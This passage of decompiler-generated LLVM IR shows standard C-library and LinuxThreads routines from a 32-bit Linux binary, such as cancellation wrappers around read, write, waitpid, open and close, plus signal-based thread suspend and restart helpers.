  %v3_8057a87 = call i32 @__libc_write(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_8057a87, i32* @ebx, align 4
  %v3_8057a92 = load i32, i32* %stack_var_-8, align 4
  %v2_8057a96 = trunc i32 %v3_8057a92 to i8
  %v3_8057a96 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057a96, i32 0)
  %v0_8057a9b = load i32, i32* @ebx, align 4
  %v2_8057aa0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8057aa0, i32* @ebx, align 4
  ret i32 %v0_8057a9b
}

define i32 @waitpid(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057aa2 = load i32, i32* @ebx, align 4
  store i32 %v0_8057aa2, i32* %stack_var_-4, align 4
  %v2_8057aa6 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057aad = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057aa6)
  %v3_8057ac1 = call i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v3_8057ac1, i32* @ebx, align 4
  %v3_8057acc = load i32, i32* %stack_var_-8, align 4
  %v2_8057ad0 = trunc i32 %v3_8057acc to i8
  %v3_8057ad0 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057ad0, i32 0)
  %v0_8057ad5 = load i32, i32* @ebx, align 4
  %v2_8057ada = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8057ada, i32* @ebx, align 4
  ret i32 %v0_8057ad5
}

define i32 @wait(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8057ae0 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057ae7 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057ae0)
  %v1_8057af1 = call i32 @__libc_wait(i32 %arg1)
  store i32 %v1_8057af1, i32* @ebx, align 4
  %v3_8057afc = load i32, i32* %stack_var_-8, align 4
  %v2_8057b00 = trunc i32 %v3_8057afc to i8
  %v3_8057b00 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057b00, i32 0)
  %v0_8057b05 = load i32, i32* @ebx, align 4
  ret i32 %v0_8057b05
}

define i32 @tcdrain(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8057b10 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057b17 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057b10)
  %v1_8057b21 = call i32 @__libc_tcdrain(i32 %arg1)
  store i32 %v1_8057b21, i32* @ebx, align 4
  %v3_8057b2c = load i32, i32* %stack_var_-8, align 4
  %v2_8057b30 = trunc i32 %v3_8057b2c to i8
  %v3_8057b30 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057b30, i32 0)
  %v0_8057b35 = load i32, i32* @ebx, align 4
  ret i32 %v0_8057b35
}

define i32 @system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057b3c = load i32, i32* @ebx, align 4
  store i32 %v0_8057b3c, i32* %stack_var_-4, align 4
  %v2_8057b40 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057b47 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057b40)
  store i32 1, i32* @ecx, align 4
  %v1_8057b51 = call i32 @__libc_system(i32 %arg1)
  store i32 %v1_8057b51, i32* @ebx, align 4
  %v3_8057b5c = load i32, i32* %stack_var_-8, align 4
  %v2_8057b60 = trunc i32 %v3_8057b5c to i8
  %v3_8057b60 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057b60, i32 0)
  %v0_8057b65 = load i32, i32* @ebx, align 4
  %v2_8057b6a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8057b6a, i32* @ebx, align 4
  ret i32 %v0_8057b65
}

define i32 @read(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057b6c = load i32, i32* @ebx, align 4
  store i32 %v0_8057b6c, i32* %stack_var_-4, align 4
  %v2_8057b70 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057b77 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057b70)
  %v3_8057b8b = call i32 @__libc_read(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_8057b8b, i32* @ebx, align 4
  %v3_8057b96 = load i32, i32* %stack_var_-8, align 4
  %v2_8057b9a = trunc i32 %v3_8057b96 to i8
  %v3_8057b9a = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057b9a, i32 0)
  %v0_8057b9f = load i32, i32* @ebx, align 4
  %v2_8057ba4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8057ba4, i32* @ebx, align 4
  ret i32 %v0_8057b9f
}

define i32 @pwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8057baa = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057bb1 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057baa)
  %v4_8057bc6 = call i32 @__libc_pwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  store i32 %v4_8057bc6, i32* @ebx, align 4
  %v3_8057bd2 = load i32, i32* %stack_var_-8, align 4
  %v2_8057bd6 = trunc i32 %v3_8057bd2 to i8
  %v3_8057bd6 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057bd6, i32 0)
  %v0_8057bdb = load i32, i32* @ebx, align 4
  ret i32 %v0_8057bdb
}

define i32 @pread64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_8057be7 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %arg5, i32* @esi, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v3_8057bf6 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057be7)
  %v0_8057bfb = load i32, i32* @esi, align 4
  %v0_8057bfe = load i32, i32* @ebx, align 4
  %v5_8057c0b = call i32 @__libc_pread64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v0_8057bfe, i32 %v0_8057bfb)
  store i32 %v5_8057c0b, i32* @ebx, align 4
  %v3_8057c17 = load i32, i32* %stack_var_-12, align 4
  %v2_8057c1b = trunc i32 %v3_8057c17 to i8
  %v3_8057c1b = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057c1b, i32 0)
  %v0_8057c20 = load i32, i32* @ebx, align 4
  ret i32 %v0_8057c20
}

define i32 @pread(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8057c2c = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057c33 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057c2c)
  %v4_8057c48 = call i32 @__libc_pread(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  store i32 %v4_8057c48, i32* @ebx, align 4
  %v3_8057c54 = load i32, i32* %stack_var_-8, align 4
  %v2_8057c58 = trunc i32 %v3_8057c54 to i8
  %v3_8057c58 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057c58, i32 0)
  %v0_8057c5d = load i32, i32* @ebx, align 4
  ret i32 %v0_8057c5d
}

define i32 @pause(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8057c68 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057c6f = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057c68)
  %v0_8057c74 = call i32 @__libc_pause()
  store i32 1, i32* @ecx, align 4
  store i32 %v0_8057c74, i32* @ebx, align 4
  %v3_8057c7f = load i32, i32* %stack_var_-8, align 4
  %v2_8057c83 = trunc i32 %v3_8057c7f to i8
  %v3_8057c83 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057c83, i32 0)
  %v0_8057c88 = load i32, i32* @ebx, align 4
  ret i32 %v0_8057c88
}

define i32 @open64(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8057c93 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057c9a = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057c93)
  %v3_8057cb6 = trunc i32 %arg2 to i8
  %v4_8057cb6 = call i32 @__GI___libc_open64(i32 %arg1, i8 %v3_8057cb6, i32 %arg3)
  store i32 %v4_8057cb6, i32* @ebx, align 4
  %v3_8057cc1 = load i32, i32* %stack_var_-8, align 4
  %v2_8057cc5 = trunc i32 %v3_8057cc1 to i8
  %v3_8057cc5 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057cc5, i32 0)
  %v0_8057cca = load i32, i32* @ebx, align 4
  ret i32 %v0_8057cca
}

define i32 @open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057cd1 = load i32, i32* @ebx, align 4
  store i32 %v0_8057cd1, i32* %stack_var_-4, align 4
  %v2_8057cd5 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057cdc = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057cd5)
  %v3_8057cf8 = trunc i32 %arg2 to i8
  %v4_8057cf8 = call i32 @__libc_open(i32 %arg1, i8 %v3_8057cf8, i32 %tmp2)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v4_8057cf8, i32* @ebx, align 4
  %v3_8057d03 = load i32, i32* %stack_var_-8, align 4
  %v2_8057d07 = trunc i32 %v3_8057d03 to i8
  %v3_8057d07 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057d07, i32 0)
  %v0_8057d0c = load i32, i32* @ebx, align 4
  %v2_8057d11 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8057d11, i32* @ebx, align 4
  ret i32 %v0_8057d0c
}

define i32 @nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057d13 = load i32, i32* @ebx, align 4
  store i32 %v0_8057d13, i32* %stack_var_-4, align 4
  %v2_8057d17 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057d1e = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057d17)
  store i32 %v2_8057d17, i32* @ebx, align 4
  %v2_8057d2d = call i32 @__libc_nanosleep(i32 %arg1, i32 %arg2)
  store i32 %v2_8057d2d, i32* @ebx, align 4
  %v3_8057d38 = load i32, i32* %stack_var_-8, align 4
  %v2_8057d3c = trunc i32 %v3_8057d38 to i8
  %v3_8057d3c = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057d3c, i32 0)
  %v0_8057d41 = load i32, i32* @ebx, align 4
  %v2_8057d46 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8057d46, i32* @ebx, align 4
  ret i32 %v0_8057d41
}

define i32 @msync(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v2_8057d4c = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057d53 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057d4c)
  %v3_8057d67 = call i32 @__libc_msync(i32 %arg1, i32 %tmp1, i32 %tmp2)
  store i32 %v3_8057d67, i32* @ebx, align 4
  %v3_8057d72 = load i32, i32* %stack_var_-8, align 4
  %v2_8057d76 = trunc i32 %v3_8057d72 to i8
  %v3_8057d76 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057d76, i32 0)
  %v0_8057d7b = load i32, i32* @ebx, align 4
  ret i32 %v0_8057d7b
}

define i32 @lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_8057d87 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %arg2, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v3_8057d96 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057d87)
  %v0_8057d9f = load i32, i32* @esi, align 4
  %v0_8057da0 = load i32, i32* @ebx, align 4
  %v4_8057da5 = call i32 @__libc_lseek64(i32 %arg1, i32 %v0_8057da0, i32 %v0_8057d9f, i32 %arg4)
  store i32 %v4_8057da5, i32* @ebx, align 4
  %v3_8057db1 = load i32, i32* %stack_var_-12, align 4
  %v0_8057db5 = load i32, i32* @edx, align 4
  store i32 %v0_8057db5, i32* @esi, align 4
  %v2_8057db7 = trunc i32 %v3_8057db1 to i8
  %v3_8057db7 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057db7, i32 0)
  %v0_8057dbc = load i32, i32* @ebx, align 4
  ret i32 %v0_8057dbc
}

define i32 @lseek(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v2_8057dca = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057dd1 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057dca)
  %v3_8057de5 = call i32 @__GI___libc_lseek(i32 %arg1, i32 %tmp1, i32 %tmp2)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v3_8057de5, i32* @ebx, align 4
  %v3_8057df0 = load i32, i32* %stack_var_-8, align 4
  %v2_8057df4 = trunc i32 %v3_8057df0 to i8
  %v3_8057df4 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057df4, i32 0)
  %v0_8057df9 = load i32, i32* @ebx, align 4
  ret i32 %v0_8057df9
}

define i32 @fsync(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8057e04 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057e0b = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057e04)
  store i32 1, i32* @ecx, align 4
  %v1_8057e15 = call i32 @__libc_fsync(i32 %arg1)
  store i32 %v1_8057e15, i32* @ebx, align 4
  %v3_8057e20 = load i32, i32* %stack_var_-8, align 4
  %v2_8057e24 = trunc i32 %v3_8057e20 to i8
  %v3_8057e24 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057e24, i32 0)
  %v0_8057e29 = load i32, i32* @ebx, align 4
  ret i32 %v0_8057e29
}

define i32 @fcntl(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057e30 = load i32, i32* @ebx, align 4
  store i32 %v0_8057e30, i32* %stack_var_-4, align 4
  %v2_8057e34 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057e3b = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057e34)
  %v3_8057e57 = call i32 @__libc_fcntl(i32 %arg1, i32 %tmp1, i32 %tmp2)
  store i32 %v3_8057e57, i32* @ebx, align 4
  %v3_8057e62 = load i32, i32* %stack_var_-8, align 4
  %v2_8057e66 = trunc i32 %v3_8057e62 to i8
  %v3_8057e66 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057e66, i32 0)
  %v0_8057e6b = load i32, i32* @ebx, align 4
  %v2_8057e70 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8057e70, i32* @ebx, align 4
  ret i32 %v0_8057e6b
}

define i32 @close(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057e72 = load i32, i32* @ebx, align 4
  store i32 %v0_8057e72, i32* %stack_var_-4, align 4
  %v2_8057e76 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057e7d = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057e76)
  %v1_8057e87 = call i32 @__libc_close(i32 %arg1)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v1_8057e87, i32* @ebx, align 4
  %v3_8057e92 = load i32, i32* %stack_var_-8, align 4
  %v2_8057e96 = trunc i32 %v3_8057e92 to i8
  %v3_8057e96 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057e96, i32 0)
  %v0_8057e9b = load i32, i32* @ebx, align 4
  %v2_8057ea0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8057ea0, i32* @ebx, align 4
  ret i32 %v0_8057e9b

; uselistorder directives
  uselistorder i32 (i8, i32)* @__GI_pthread_setcanceltype, { 44, 45, 30, 31, 0, 1, 2, 3, 4, 5, 6, 7, 52, 53, 32, 33, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 34, 35, 38, 39, 18, 19, 20, 21, 28, 29, 50, 51, 46, 47, 42, 43, 48, 49, 22, 23, 24, 25, 36, 37, 26, 27, 40, 41 }
}

define i32 @__libc_current_sigrtmin() local_unnamed_addr {
entry:
  %v0_8057ea4 = load i32, i32* @global_var_8073d58.694, align 8
  ret i32 %v0_8057ea4
}

define i32 @__libc_current_sigrtmax() local_unnamed_addr {
entry:
  %v0_8057eaa = load i32, i32* @global_var_8073d5c.695, align 4
  ret i32 %v0_8057eaa
}

define i32 @__libc_allocate_rtsig(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8057eb0 = load i32, i32* @global_var_8073d58.694, align 8
  %v1_8057eb6 = add i32 %v0_8057eb0, 1
  %v10_8057eb6 = icmp eq i32 %v1_8057eb6, 0
  br i1 %v10_8057eb6, label %dec_label_pc_8057ee2, label %dec_label_pc_8057ebb

dec_label_pc_8057ebb:                             ; preds = %entry
  %v0_8057ebb = load i32, i32* @global_var_8073d5c.695, align 4
  %v8_8057ec3 = icmp sgt i32 %v0_8057eb0, %v0_8057ebb
  br i1 %v8_8057ec3, label %dec_label_pc_8057ee2, label %dec_label_pc_8057ec5

dec_label_pc_8057ec5:                             ; preds = %dec_label_pc_8057ebb
  %v4_8057ec5 = icmp eq i32 %arg1, 0
  br i1 %v4_8057ec5, label %dec_label_pc_8057ed6, label %dec_label_pc_8057ecc

dec_label_pc_8057ecc:                             ; preds = %dec_label_pc_8057ec5
  store i32 %v1_8057eb6, i32* @global_var_8073d58.694, align 8
  br label %dec_label_pc_8057ee5

dec_label_pc_8057ed6:                             ; preds = %dec_label_pc_8057ec5
  %v1_8057ed6 = add i32 %v0_8057ebb, -1
  store i32 %v1_8057ed6, i32* @global_var_8073d5c.695, align 4
  br label %dec_label_pc_8057ee5

dec_label_pc_8057ee2:                             ; preds = %dec_label_pc_8057ebb, %entry
  br label %dec_label_pc_8057ee5

dec_label_pc_8057ee5:                             ; preds = %dec_label_pc_8057ed6, %dec_label_pc_8057ecc, %dec_label_pc_8057ee2
  %v0_8057ee5 = phi i32 [ %v0_8057ebb, %dec_label_pc_8057ed6 ], [ %v0_8057eb0, %dec_label_pc_8057ecc ], [ -1, %dec_label_pc_8057ee2 ]
  ret i32 %v0_8057ee5

; uselistorder directives
  uselistorder label %dec_label_pc_8057ee5, { 2, 0, 1 }
}

define i32 @pthread_equal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v15_8057eec = icmp eq i32 %arg1, %arg2
  %v1_8057ef0 = zext i1 %v15_8057eec to i32
  ret i32 %v1_8057ef0
}

define i32 @pthread_handle_sigdebug() local_unnamed_addr {
entry:
  %v0_8057ef7 = load i32, i32* @eax, align 4
  ret i32 %v0_8057ef7
}

define i32 @__pthread_setconcurrency(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_807a638.696, align 8
  ret i32 0
}

define i32 @__pthread_getconcurrency() local_unnamed_addr {
entry:
  %v0_8057f04 = load i32, i32* @global_var_807a638.696, align 8
  ret i32 %v0_8057f04
}

define i32 @__pthread_timedsuspend_new(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = call i64 @__decompiler_undefined_function_4()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-432 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057f0a = load i32, i32* @ebx, align 4
  store i32 %v0_8057f0a, i32* %stack_var_-4, align 4
  %v2_8057f13 = ptrtoint i32* %stack_var_-432 to i32
  %v3_8057f18 = call i32 @__sigsetjmp(i32 %v2_8057f13, i32* inttoptr (i32 1 to i32*))
  store i32 1, i32* @edx, align 4
  %v1_8057f25 = icmp eq i32 %v3_8057f18, 0
  %v1_8057f27 = icmp eq i1 %v1_8057f25, false
  br i1 %v1_8057f27, label %entry.dec_label_pc_805800c_crit_edge, label %dec_label_pc_8057f2d

entry.dec_label_pc_805800c_crit_edge:             ; preds = %entry
  %.pre = add i32 %arg1, 36
  %.pre4 = inttoptr i32 %.pre to i32*
  br label %dec_label_pc_805800c

dec_label_pc_8057f2d:                             ; preds = %entry
  %tmp6 = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v2_8057f3b = add i32 %arg1, 36
  %v3_8057f3b = inttoptr i32 %v2_8057f3b to i32*
  store i32 %v2_8057f13, i32* %v3_8057f3b, align 4
  %v0_8057f3e = load i32, i32* %edx.global-to-local, align 4
  %v1_8057f3e = add i32 %v0_8057f3e, 32
  %v2_8057f3e = inttoptr i32 %v1_8057f3e to i32*
  store i32 0, i32* %v2_8057f3e, align 4
  %v2_8057f45 = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_8057f45, i32* @ebx, align 4
  %v1_8057f4d = call i32 @sigemptyset(i32 %v2_8057f45)
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_8057f54 = load i32, i32* @global_var_8073c88.687, align 8
  %v2_8057f5b = call i32 @__GI_sigaddset(i32 %v2_8057f45, i32 %v0_8057f54)
  %v2_8057f63 = ptrtoint i32* %stack_var_-276 to i32
  %v3_8057f6e = bitcast i32* %stack_var_-148 to %_TYPEDEF_sigset_t*
  %v4_8057f6e = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_8057f6e, i32 %v2_8057f63)
  %v2_8057f7a = ptrtoint i32* %stack_var_-12 to i32
  %v7_8057f87 = mul nsw i64 %tmp7, 1000
  %v8_8057f87 = trunc i64 %v7_8057f87 to i32
  %v1_8057f99 = add i32 %tmp6, 4
  %v2_8057f99 = inttoptr i32 %v1_8057f99 to i32*
  %v2_8057fe1 = ptrtoint i32* %stack_var_-20 to i32
  br label %dec_label_pc_8057f76

dec_label_pc_8057f76:                             ; preds = %dec_label_pc_8057fdd, %dec_label_pc_8057f2d
  %v0_8057f76 = load i32, i32* @ecx, align 4
  %v4_8057f82 = call i32 @gettimeofday(i32 %v2_8057f7a, i32 0, i32 %v0_8057f76, i32 %v0_8057f76)
  %v3_8057f99 = load i32, i32* %v2_8057f99, align 4
  store i32 %v3_8057f99, i32* %edx.global-to-local, align 4
  %v2_8057f9c = load i32, i32* %arg2, align 4
  %v4_8057f9e = load i32, i32* %stack_var_-12, align 4
  %v5_8057f9e = sub i32 %v2_8057f9c, %v4_8057f9e
  %v2_8057fa5 = sub i32 %v3_8057f99, %v8_8057f87
  %v13_8057fa5 = icmp slt i32 %v2_8057fa5, 0
  store i32 %v2_8057fa5, i32* %edx.global-to-local, align 4
  %v1_8057fba = icmp eq i1 %v13_8057fa5, false
  br i1 %v1_8057fba, label %dec_label_pc_8057fd3, label %dec_label_pc_8057fbc

dec_label_pc_8057fbc:                             ; preds = %dec_label_pc_8057f76
  %v1_8057fc9 = add i32 %v5_8057f9e, -1
  br label %dec_label_pc_8057fd3

dec_label_pc_8057fd3:                             ; preds = %dec_label_pc_8057f76, %dec_label_pc_8057fbc
  %storemerge = phi i32 [ %v1_8057fc9, %dec_label_pc_8057fbc ], [ %v5_8057f9e, %dec_label_pc_8057f76 ]
  %v3_8057fd3 = phi i32 [ %v1_8057fc9, %dec_label_pc_8057fbc ], [ %v5_8057f9e, %dec_label_pc_8057f76 ]
  store i32 %storemerge, i32* %stack_var_-20, align 4
  %v5_8057fd3 = icmp slt i32 %v3_8057fd3, 0
  br i1 %v5_8057fd3, label %dec_label_pc_8057ff5, label %dec_label_pc_8057fdd

dec_label_pc_8057fdd:                             ; preds = %dec_label_pc_8057fd3
  %v2_8057fe9 = call i32 @__libc_nanosleep(i32 %v2_8057fe1, i32 0)
  %v1_8057ff1 = icmp eq i32 %v2_8057fe9, 0
  %v1_8057ff3 = icmp eq i1 %v1_8057ff1, false
  br i1 %v1_8057ff3, label %dec_label_pc_8057f76, label %dec_label_pc_8057ff5

dec_label_pc_8057ff5:                             ; preds = %dec_label_pc_8057fdd, %dec_label_pc_8057fd3
  %v3_8058002 = bitcast i32* %stack_var_-276 to %_TYPEDEF_sigset_t*
  %v4_8058002 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8058002, i32 0)
  store i32 0, i32* @edx, align 4
  br label %dec_label_pc_805800c

dec_label_pc_805800c:                             ; preds = %entry.dec_label_pc_805800c_crit_edge, %dec_label_pc_8057ff5
  %v2_8058013.pre-phi = phi i32* [ %.pre4, %entry.dec_label_pc_805800c_crit_edge ], [ %v3_8057f3b, %dec_label_pc_8057ff5 ]
  store i32 %arg1, i32* @ecx, align 4
  store i32 0, i32* %v2_8058013.pre-phi, align 4
  %v0_805801a = load i32, i32* @edx, align 4
  %v2_8058022 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8058022, i32* @ebx, align 4
  ret i32 %v0_805801a

; uselistorder directives
  uselistorder i32 %v1_8057fc9, { 1, 0 }
  uselistorder i32 %v5_8057f9e, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @__libc_nanosleep, { 1, 0 }
  uselistorder i32 (i32, i32*)* @__sigsetjmp, { 1, 0 }
  uselistorder i32 %arg1, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_805800c, { 1, 0 }
  uselistorder label %dec_label_pc_8057fd3, { 1, 0 }
}

define i32 @__pthread_restart_new(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8058027 = load i32, i32* @global_var_8073c88.687, align 8
  %v1_8058031 = add i32 %arg1, 20
  %v2_8058031 = inttoptr i32 %v1_8058031 to i32*
  %v3_8058031 = load i32, i32* %v2_8058031, align 4
  %v2_8058034 = call i32 @kill(i32 %v3_8058031, i32 %v0_8058027)
  ret i32 %v2_8058034
}

define i32 @__pthread_wait_for_restart_signal(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805803d = load i32, i32* @esi, align 4
  %v0_805803e = load i32, i32* @ebx, align 4
  store i32 %v0_805803e, i32* %stack_var_-8, align 4
  %v2_8058045 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_8058045, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v4_8058055 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* null, i32 %v2_8058045)
  %v1_8058063 = call i32 @__GI_sigdelset(i32 %v2_8058045)
  %v0_8058068 = load i32, i32* @esi, align 4
  %v1_8058068 = add i32 %v0_8058068, 32
  %v2_8058068 = inttoptr i32 %v1_8058068 to i32*
  store i32 0, i32* %v2_8058068, align 4
  %v1_805807a = bitcast i32* %stack_var_-136 to %_TYPEDEF_sigset_t*
  br label %dec_label_pc_8058072

dec_label_pc_8058072:                             ; preds = %dec_label_pc_8058072, %entry
  %v2_805807a = call i32 @__libc_sigsuspend(%_TYPEDEF_sigset_t* %v1_805807a)
  %v0_805807f = load i32, i32* @esi, align 4
  %v1_805807f = add i32 %v0_805807f, 32
  %v2_805807f = inttoptr i32 %v1_805807f to i32*
  %v3_805807f = load i32, i32* %v2_805807f, align 4
  %v1_8058085 = load i32, i32* @global_var_8073c88.687, align 8
  %v12_8058085 = icmp eq i32 %v3_805807f, %v1_8058085
  %v1_805808b = icmp eq i1 %v12_8058085, false
  br i1 %v1_805808b, label %dec_label_pc_8058072, label %dec_label_pc_805808d

dec_label_pc_805808d:                             ; preds = %dec_label_pc_8058072
  %v2_8058093 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8058093, i32* @ebx, align 4
  store i32 %v0_805803d, i32* @esi, align 4
  ret i32 %v3_805807f

; uselistorder directives
  uselistorder i32 %v3_805807f, { 1, 0 }
  uselistorder i32 %v2_8058045, { 1, 0, 2 }
  uselistorder i32 (%_TYPEDEF_sigset_t*)* @__libc_sigsuspend, { 1, 0 }
}

define i32 @suspend.10() local_unnamed_addr {
entry:
  %v0_8058099 = load i32, i32* @eax, align 4
  %v1_805809a = call i32 @__pthread_wait_for_restart_signal(i32 %v0_8058099)
  ret i32 %v1_805809a
}

define i32 @__pthread_find_self() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_80580a3 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_80580a3, i32* @ecx, align 4
